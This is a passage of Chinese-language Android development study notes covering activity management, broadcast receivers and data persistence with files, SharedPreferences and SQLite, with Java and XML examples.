<h3 id="活动管理">活动管理<a class="header-anchor" href="#活动管理"> ¶ </a></h3>
<h4 id="了解当前界面对应活动">了解当前界面对应活动<a class="header-anchor" href="#了解当前界面对应活动"> ¶ </a></h4>
<p>创建自己的Activity基类BaseActivity；并让所有activity继承该类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        Log.d(<span class="string">&quot;BaseActivity&quot;</span>, getClass().getSimpleName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当进入新activity时，会打印当前activity的类名</p>
<h4 id="活动管理器">活动管理器<a class="header-anchor" href="#活动管理器"> ¶ </a></h4>
<p>ActivityCollector</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ActivityCollector</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> List&lt;Activity&gt; activities = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">addActivity</span><span class="params">(Activity activity)</span> </span>&#123;</span><br><span class="line">        activities.add(activity);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">removeActivity</span><span class="params">(Activity activity)</span> </span>&#123;</span><br><span class="line">        activities.remove(activity);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">finishAll</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (Activity activity : activities) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!activity.isFinishing()) &#123;</span><br><span class="line">                activity.finish();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        activities.clear();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>BaseActivity</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        Log.d(<span class="string">&quot;BaseActivity&quot;</span>, getClass().getSimpleName());</span><br><span class="line">        ActivityCollector.addActivity(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line"></span><br><span class="line">        ActivityCollector.removeActivity(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在BaseActivity 的onCreate() 方法中调用了ActivityCollector 的addActivity() 方法，表明将当前正在创建的活动添加到活动管理器里。然后在BaseActivity 中重写onDestroy() 方法，并调用了ActivityCollector 的removeActivity()方法，表明将一个马上要销毁的活动从活动管理器里移除。</p>
<h5 id="退出程序">退出程序<a class="header-anchor" href="#退出程序"> ¶ </a></h5>
<p>不管你想在什么地方退出程序，只需要调用ActivityCollector.finishAll() 方法就可以了</p>
<p>退出后还可以杀调当前进程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">android.os.Process.killProcess(android.os.Process.myPid());</span><br></pre></td></tr></table></figure>
<h4 id="启动Activity">启动Activity<a class="header-anchor" href="#启动Activity"> ¶ </a></h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">actionStart</span><span class="params">(Context context, String data1, String data2)</span> </span>&#123;</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent(context, [current_activity.class]);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;param1&quot;</span>, data1);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;param2&quot;</span>, data2);</span><br><span class="line">        context.startActivity(intent);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>可以快速调用含有该方法的Activity</p>
<h2 id="广播接收者BroadcastReceiver">广播接收者BroadcastReceiver<a class="header-anchor" href="#广播接收者BroadcastReceiver"> ¶ </a></h2>
<h3 id="广播机制简介">广播机制简介<a class="header-anchor" href="#广播机制简介"> ¶ </a></h3>
<ul>
<li>
<pre><code>标准广播 （Normal broadcasts）是一种完全异步执行的广播，在广播发出之后，所有的广播接收器几乎都会在同一时刻接收到这条广播消息，因此它们之间没有任何先后顺序可言。这种广播的效率会比较高，但同时也意味着它是无法被截断的。
</code></pre>
</li>
<li>
<pre><code>有序广播 （Ordered broadcasts）则是一种同步执行的广播，在广播发出之后，同一时刻只会有一个广播接收器能够收到这条广播消息，当这个广播接收器中的逻辑执行完毕后，广播才会继续传递。所以此时的广播接收器是有先后顺序的，优先级高的广播接收器就可以先收到广播消息，并且前面的广播接收器还可以截断正在传递的广播，这样后面的广播接收器就无法收到广播消息了。
</code></pre>
</li>
</ul>
<h3 id="接收系统广播">接收系统广播<a class="header-anchor" href="#接收系统广播"> ¶ </a></h3>
<h4 id="动态注册监听网络变化">动态注册监听网络变化<a class="header-anchor" href="#动态注册监听网络变化"> ¶ </a></h4>
<p>新建一个类，让它继承自<code>BroadcastReceiver</code> ，并重写父类的<code>onReceive()</code> 方法。当有广播到来时，<code>onReceive()</code> 方法就会得到执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> IntentFilter intentFilter;</span><br><span class="line">    <span class="keyword">private</span> NetworkChangeReceiver networkChangeReceiver;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="comment">// 创建一个intent过滤器</span></span><br><span class="line">        intentFilter = <span class="keyword">new</span> IntentFilter();</span><br><span class="line">        <span class="comment">// 添加想要接收的intent请求</span></span><br><span class="line">        intentFilter.addAction(<span class="string">&quot;android.net.conn.CONNECTIVITY_CHANGE&quot;</span>);</span><br><span class="line">        <span class="comment">// 实例化 Receiver类</span></span><br><span class="line">        networkChangeReceiver = <span class="keyword">new</span> NetworkChangeReceiver();</span><br><span class="line">        <span class="comment">// 动态注册广播接收者</span></span><br><span class="line">        registerReceiver(networkChangeReceiver, intentFilter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        <span class="comment">// 取消注册广播接收者</span></span><br><span class="line">        unregisterReceiver(networkChangeReceiver);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">NetworkChangeReceiver</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">            <span class="comment">// 当收到广播时，弹窗提示网络状态改变</span></span><br><span class="line">            Toast.makeText(context, <span class="string">&quot;network changes&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>或者当网络状态改变时，提示当前有网络还是无网络</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">NetworkChangeReceiver</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">            <span class="comment">// 得到ConnectivityManager实例(一个系统服务类，专门用于管理网络连接)</span></span><br><span class="line">            ConnectivityManager connectionManager = (ConnectivityManager)getSystemService(Context.CONNECTIVITY_SERVICE);</span><br><span class="line">            <span class="comment">// 得到NetworkInfo的实例</span></span><br><span class="line">            NetworkInfo networkInfo = connectionManager.getActiveNetworkInfo();</span><br><span class="line">            <span class="comment">// 通过调用NetworkInfo的isAvailable()方法，来判断出当前有无网络</span></span><br><span class="line">            <span class="keyword">if</span> (networkInfo != <span class="keyword">null</span> &amp;&amp; networkInfo.isAvailable()) &#123;</span><br><span class="line">                Toast.makeText(context, <span class="string">&quot;network is available&quot;</span>,</span><br><span class="line">                    Toast.LENGTH_SHORT).show();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Toast.makeText(context, <span class="string">&quot;network is unavailable&quot;</span>,</span><br><span class="line">                    Toast.LENGTH_SHORT).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同时，访问网络状态需要在<code>AndroidManifest.xml</code>中声明权限</p>
<h4 id="静态注册实现开机启动提醒">静态注册实现开机启动提醒<a class="header-anchor" href="#静态注册实现开机启动提醒"> ¶ </a></h4>
<p>需要在<code>AndroidManifest.xml</code>中注册receiver</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.BootCompleteReceiver&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 开机事件广播 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.BOOT_COMPLETED&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>同时需要添加相应监听开机的权限</p>
<p>之后便可以添加一个Receiver.java，并在<code>onReceive()</code>中编写相应控制逻辑</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BootCompleteReceiver</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">        Toast.makeText(context, <span class="string">&quot;Boot Complete&quot;</span>, Toast.LENGTH_LONG).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不要在<code>onReceive()</code> 方法中添加过多的逻辑或者进行任何的耗时操作，因为在广播接收器中是不允许开启线程的，当<code>onReceive()</code> 方法运行了较长时间而没有结束时，程序就会报错。</p>
<h4 id="发送自定义广播">发送自定义广播<a class="header-anchor" href="#发送自定义广播"> ¶ </a></h4>
<h5 id="发送标准广播">发送标准广播<a class="header-anchor" href="#发送标准广播"> ¶ </a></h5>
<h6 id="定义一个自己的广播接收器">定义一个自己的广播接收器<a class="header-anchor" href="#定义一个自己的广播接收器"> ¶ </a></h6>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBroadcastReceiver</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">        Toast.makeText(context, <span class="string">&quot;received in MyBroadcastReceiver&quot;</span>, Toast.LENGTH_</span><br><span class="line">            SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.MyBroadcastReceiver&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.broadcasttest.MY_BROADCAST&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>接收一个值为<code>com.example.broadcasttest.MY_BROADCAST</code>的广播</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">    Intent intent = <span class="keyword">new</span> Intent(<span class="string">&quot;com.example.broadcasttest.MY_BROADCAST&quot;</span>);</span><br><span class="line">    sendBroadcast(intent);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 同</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">    Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">    intent.setAction(<span class="string">&quot;com.example.broadcasttest.MY_BROADCAST&quot;</span>);</span><br><span class="line">    intent.setPackage(<span class="string">&quot;com.example.broadcasttest&quot;</span>);</span><br><span class="line">    sendBroadcast(intent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于广播是使用Intent进行传递的，因此你还可以在Intent中携带一些数据传递给广播接收器。</p>
<h5 id="发送有序广播">发送有序广播<a class="header-anchor" href="#发送有序广播"> ¶ </a></h5>
<p>发送时</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">    Intent intent = <span class="keyword">new</span></span><br><span class="line">        Intent(<span class="string">&quot;com.example.broadcasttest.MY_BROADCAST&quot;</span>);</span><br><span class="line">    sendOrderedBroadcast(intent, <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接收时，通过<code>android.priority</code>属性来设置优先级</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.MyBroadcastReceiver&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span> <span class="attr">android:priority</span>=<span class="string">&quot;100&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.broadcasttest.MY_BROADCAST&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>同时通过<code>abortBroadcast()</code>方法来截断广播（之后的广播接收器无法收到）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">    Toast.makeText(context, <span class="string">&quot;received in MyBroadcastReceiver&quot;</span>,</span><br><span class="line">        Toast.LENGTH_SHORT).show();</span><br><span class="line">    abortBroadcast();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="使用本地广播">使用本地广播<a class="header-anchor" href="#使用本地广播"> ¶ </a></h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> IntentFilter intentFilter;</span><br><span class="line">    <span class="keyword">private</span> LocalReceiver localReceiver;</span><br><span class="line">    <span class="keyword">private</span> LocalBroadcastManager localBroadcastManager;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        localBroadcastManager = LocalBroadcastManager.getInstance(<span class="keyword">this</span>); <span class="comment">// 获取实例</span></span><br><span class="line">        Button button = (Button) findViewById(R.id.button);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                Intent intent = <span class="keyword">new</span> Intent(<span class="string">&quot;com.example.broadcasttest.LOCAL_BROADCAST&quot;</span>);</span><br><span class="line">                localBroadcastManager.sendBroadcast(intent); <span class="comment">// 发送本地广播</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        intentFilter = <span class="keyword">new</span> IntentFilter();</span><br><span class="line">        intentFilter.addAction(<span class="string">&quot;com.example.broadcasttest.LOCAL_BROADCAST&quot;</span>);</span><br><span class="line">        localReceiver = <span class="keyword">new</span> LocalReceiver();</span><br><span class="line">        localBroadcastManager.registerReceiver(localReceiver, intentFilter); <span class="comment">// 注</span></span><br><span class="line">        册本地广播监听器</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        localBroadcastManager.unregisterReceiver(localReceiver);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">LocalReceiver</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">            Toast.makeText(context, <span class="string">&quot;received local broadcast&quot;</span>, Toast.LENGTH_SHORT).</span><br><span class="line"></span><br><span class="line">               show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>与动态注册广播接收器一样，不过现在是通过<code>LocalBroadcastManager</code>的<code>getInstance()</code> 方法得到了它的一个实例，然后在注册广播接收器的时候调用的是<code>LocalBroadcastManager</code>的<code>registerReceiver()</code> 方法，在发送广播的时候调用的是<code>LocalBroadcastManager</code>的<code>sendBroadcast()</code> 方法</p>
<p><strong>本地广播是无法通过静态注册的方式来接收</strong></p>
<h3 id="使用广播来实现强制下线功能">使用广播来实现强制下线功能<a class="header-anchor" href="#使用广播来实现强制下线功能"> ¶ </a></h3>
<p>@TODO</p>
<h2 id="数据存储-持久化技术">数据存储 持久化技术<a class="header-anchor" href="#数据存储-持久化技术"> ¶ </a></h2>
<h3 id="文件存储">文件存储<a class="header-anchor" href="#文件存储"> ¶ </a></h3>
<ul>
<li>Context 类中提供了一个openFileOutput() 方法，可以用于将数据存储到指定的文件中。
<ul>
<li>第一个参数为文件名（默认存储到<code>/data/data/&lt;package name&gt;/files/</code>目录下）</li>
<li>第二个参数是文件的操作模式，主要有两种模式可选，MODE_PRIVATE和MODE_APPEND。其中MODE_PRIVATE是默认的操作模式，表示当指定同样文件名的时候，所写入的内容将会覆盖原文件中的内容，而MODE_APPEND则表示如果该文件已存在，就往文件里面追加内容，不存在就创建新文件。</li>
<li>返回的是一个FileOutputStream 对象</li>
</ul>
</li>
<li>Context 类中还提供了一个openFileInput() 方法，用于从文件中读取数据。
<ul>
<li>只接收一个参数，即要读取的文件名</li>
</ul>
</li>
</ul>
<h3 id="SD卡文件读写">SD卡文件读写<a class="header-anchor" href="#SD卡文件读写"> ¶ </a></h3>
<ol>
<li>
<p>判断是否手机插入SD卡，并且程序有读写SD卡的权限。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Environment.getExternalStorageState().equals(android</span><br><span class="line">        .os.Environment.MEDIA_MOUNTED);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>获得SD卡目录：getExternalFilesDir(“类型&quot; )</p>
<p>“类型”参数：可为null或右图所列</p>
<ul>
<li>null：表示sdcard/data/android/包名/files</li>
<li>Enviroment.DIRECTORY_DCIM(或“DCIM”)：表示sdcard/data/android/包名/files/DCIM</li>
</ul>
</li>
</ol>
<p>手机插入SD卡，在AVD中通过mksdcard命令来创建。</p>
<p>获得读写SD卡的权限需要在AndroidManifest.xml中添加读写权限。</p>
<h3 id="SharedPreferences存储">SharedPreferences存储<a class="header-anchor" href="#SharedPreferences存储"> ¶ </a></h3>
<p>SharedPreferences文件是使用XML格式来对数据进行管理的。</p>
<h4 id="将数据存储到SharedPreferences中">将数据存储到SharedPreferences中<a class="header-anchor" href="#将数据存储到SharedPreferences中"> ¶ </a></h4>
<h5 id="获取SharedPreferences对象">获取SharedPreferences对象<a class="header-anchor" href="#获取SharedPreferences对象"> ¶ </a></h5>
<ul>
<li>Context 类中的getSharedPreferences() 方法
<ul>
<li>第一个参数用于指定SharedPreferences文件的名称，如果指定的文件不存在则会创建一个，SharedPreferences文件都是存放在<code>/data/data/&lt;package name&gt;/shared_prefs/</code>目录下</li>
<li>第二个参数用于指定操作模式，目前只有MODE_PRIVATE这一种模式可选，它是默认的操作模式，和直接传入<code>0</code>效果是相同的，表示只有当前的应用程序才可以对这个SharedPreferences文件进行读写。其他几种操作模式均已被废弃</li>
</ul>
</li>
<li>Activity 类中的getPreferences() 方法
<ul>
<li>它只接收一个操作模式参数。会自动将当前活动的类名作为SharedPreferences的文件名。</li>
</ul>
</li>
<li>PreferenceManager 类中的getDefaultSharedPreferences() 方法
<ul>
<li>这是一个静态方法，它接收一个Context 参数，并自动使用当前应用程序的包名作为前缀来命名SharedPreferences文件</li>
</ul>
</li>
</ul>
<h5 id="使用对象进行存储">使用对象进行存储<a class="header-anchor" href="#使用对象进行存储"> ¶ </a></h5>
<ol>
<li>调用SharedPreferences 对象的edit() 方法来获取一个SharedPreferences.Editor 对象。</li>
<li>向SharedPreferences.Editor 对象中添加数据，比如添加一个布尔型数据就使用putBoolean() 方法，添加一个字符串则使用putString() 方法，以此类推。</li>
<li>调用apply() 方法将添加的数据提交，从而完成数据存储操作。</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">SharedPreferences.Editor editor = getSharedPreferences(<span class="string">&quot;data&quot;</span>, MODE_PRIVATE).edit();</span><br><span class="line">editor.putString(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;Tom&quot;</span>);</span><br><span class="line">editor.putInt(<span class="string">&quot;age&quot;</span>, <span class="number">28</span>);</span><br><span class="line">editor.putBoolean(<span class="string">&quot;married&quot;</span>, <span class="keyword">false</span>);</span><br><span class="line">editor.apply();</span><br></pre></td></tr></table></figure>
<h4 id="从SharedPreferences中读取数据">从SharedPreferences中读取数据<a class="header-anchor" href="#从SharedPreferences中读取数据"> ¶ </a></h4>
<p>获得<code>SharedPreferences</code>对象后调用相应的<code>getString() 、getInt() 和getBoolean() </code>方法来获取</p>
<h3 id="SQLite数据库存储">SQLite数据库存储<a class="header-anchor" href="#SQLite数据库存储"> ¶ </a></h3>
<h4 id="创建数据库">创建数据库<a class="header-anchor" href="#创建数据库"> ¶ </a></h4>
<p>提供了一个SQLiteOpenHelper帮助类，借助这个类就可以非常简单地对数据库进行创建和升级。SQLiteOpenHelper是一个抽象类</p>
<p>SQLiteOpenHelper中有两个抽象方法，分别是onCreate() 和onUpgrade() ，我们必须在自己的帮助类里面重写这两个方法，然后分别在这两个方法中去实现创建、升级数据库的逻辑。</p>
<p>SQLiteOpenHelper中还有两个非常重要的实例方法：getReadableDatabase() 和getWritableDatabase() 。这两个方法都可以创建或打开一个现有的数据库（如果数据库已存在则直接打开，否则创建一个新的数据库），并返回一个可对数据库进行读写操作的对象。</p>
<p>不同的是，当数据库不可写入的时候getReadableDatabase() 方法返回的对象将以只读的方式去打开数据库，而getWritableDatabase() 方法则将出现异常。</p>
<h5 id="SQLiteOpenHelper构造方法">SQLiteOpenHelper构造方法<a class="header-anchor" href="#SQLiteOpenHelper构造方法"> ¶ </a></h5>
<ul>
<li>较少参数构造方法接收4个参数
<ul>
<li>第一个参数是<strong>Context</strong></li>
<li>第二个参数是<strong>数据库名</strong>，创建数据库时使用的就是这里指定的名称。</li>
<li>第三个参数允许我们在查询数据的时候返回一个自定义的Cursor，<strong>一般都是传入null</strong> 。</li>
<li>第四个参数表示<strong>当前数据库的版本号</strong>，可用于对数据库进行升级操作。</li>
<li>构建出SQLiteOpenHelper的实例之后，再调用它的getReadableDatabase() 或getWritableDatabase() 方法就能够创建数据库了，数据库文件会存放在<code>/data/data/ &lt;package name&gt;/databases/</code>目录下。</li>
<li>此时，重写的onCreate() 方法也会得到执行，所以通常会在这里去处理一些创建表的逻辑。</li>
</ul>
</li>
</ul>
<p>SQLite不像其他的数据库拥有众多繁杂的数据类型，它的数据类型很简单，integer 表示整型，real 表示浮点型，text 表示文本类型，blob 表示二进制类</p>
<h5 id="使用SQLiteOpenHelper实现类">使用SQLiteOpenHelper实现类<a class="header-anchor" href="#使用SQLiteOpenHelper实现类"> ¶ </a></h5>
<p>直接new 实现类，当数据库不存在时，onCreate()会被执行；当构造方法版本号大于原先版本号时，onUpgrade()会被执行</p>
<h4 id="获取数据库对象">获取数据库对象<a class="header-anchor" href="#获取数据库对象"> ¶ </a></h4>
<p>调用SQLiteOpenHelper的getReadableDatabase() 或getWritableDatabase() 方法是可以用于创建和升级数据库的。</p>
<p>这两个方法还都会返回一个QLiteDatabase 对象，借助这个对象就可以对数据进行CRUD操作了。</p>
<p>或者使用<code>SQLiteDatabase.openOrCreateDatabse(dbName,null)</code>来获取</p>
<h4 id="添加数据">添加数据<a class="header-anchor" href="#添加数据"> ¶ </a></h4>
<ul>
<li>SQLiteDatabase 中提供了一个insert() 方法，这个方法就是专门用于添加数据的。
<ul>
<li>第一个参数是表名，我们希望向哪张表里添加数据，这里就传入该表的名字。</li>
<li>第二个参数用于在未指定添加数据的情况下给某些可为空的列自动赋值NULL ，一般我们用不到这个功能，直接传入null 即可。</li>
<li>第三个参数是一个ContentValues 对象，它提供了一系列的put() 方法重载，用于向ContentValues 中添加数据，只需要将表中的每个列名以及相应的待<br>
添加数据传入即可。</li>
</ul>
</li>
</ul>
<h4 id="更新数据">更新数据<a class="header-anchor" href="#更新数据"> ¶ </a></h4>
<ul>
